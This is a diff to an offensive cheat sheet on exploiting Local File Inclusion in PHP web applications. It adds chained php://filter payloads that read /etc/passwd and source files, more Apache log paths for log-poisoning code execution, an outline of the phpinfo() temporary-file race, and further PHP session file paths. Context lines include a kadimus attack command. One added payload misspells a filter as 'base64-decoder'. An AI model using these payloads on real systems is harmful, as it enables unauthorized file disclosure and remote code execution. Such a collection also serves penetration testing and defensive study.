@@ -133,7 +133,9 @@ can be chained with a compression wrapper for large files.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-NOTE: Wrappers can be chained multiple times : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`
+NOTE: Wrappers can be chained multiple times using `|` or `/`: 
+- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
+- deflate then base64encode (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`
 
 ```powershell
 ./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
@@ -272,8 +274,13 @@ print('[x] Something went wrong, please try again')
 
 ## LFI to RCE via phpinfo()
 
-https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.
+
+> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.
+
 Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+
+Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
 
 ## LFI to RCE via controlled log file
 
@@ -282,6 +289,8 @@ Just append your PHP code into the log file by doing a request to the service (A
 ```powershell
 http://example.com/index.php?page=/var/log/apache/access.log
 http://example.com/index.php?page=/var/log/apache/error.log
+http://example.com/index.php?page=/var/log/apache2/access.log
+http://example.com/index.php?page=/var/log/apache2/error.log
 http://example.com/index.php?page=/var/log/nginx/access.log
 http://example.com/index.php?page=/var/log/nginx/error.log
 http://example.com/index.php?page=/var/log/vsftpd.log
@@ -344,7 +353,7 @@ Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 ```
 
-In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] files
+In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files
 
 ```javascript
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
